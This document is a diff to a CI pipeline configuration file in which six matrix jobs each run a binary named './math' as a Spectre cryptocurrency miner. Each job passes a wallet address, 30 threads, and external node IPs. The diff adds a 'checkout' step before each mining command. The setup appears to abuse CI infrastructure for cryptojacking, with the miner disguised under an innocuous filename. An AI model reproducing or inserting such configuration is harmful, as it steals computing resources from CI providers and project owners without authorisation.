@@ -18,6 +18,7 @@ blocks:
             values: [ "1", "2", "3" ]
           commands:
             - echo FOO=$FOO BAR=$BAR
+            - checkout
             - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.44.208.37'
         - name: 'Job #2'
           matrix:
@@ -27,6 +28,7 @@ blocks:
             values: [ "1", "2", "3" ]
           commands:
             - echo FOO=$FOO BAR=$BAR
+            - checkout
             - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.44.208.37'
         - name: 'Job #3'
           matrix:
@@ -36,6 +38,7 @@ blocks:
             values: [ "1", "2", "3" ]
           commands:
             - echo FOO=$FOO BAR=$BAR
+            - checkout
             - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.82.41.54 '
         - name: 'Job #4'
           matrix:
@@ -45,6 +48,7 @@ blocks:
             values: [ "1", "2", "3" ]
           commands:
             - echo FOO=$FOO BAR=$BAR
+            - checkout
             - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.82.41.54'
         - name: 'Job #5'
           matrix:
@@ -54,6 +58,7 @@ blocks:
             values: [ "1", "2", "3" ]
           commands:
             - echo FOO=$FOO BAR=$BAR
+            - checkout
             - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.82.41.54'
         - name: 'Job #6'
           matrix:
@@ -63,4 +68,5 @@ blocks:
             values: [ "1", "2", "3" ]
           commands:
             - echo FOO=$FOO BAR=$BAR
+            - checkout
             - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.82.41.54'
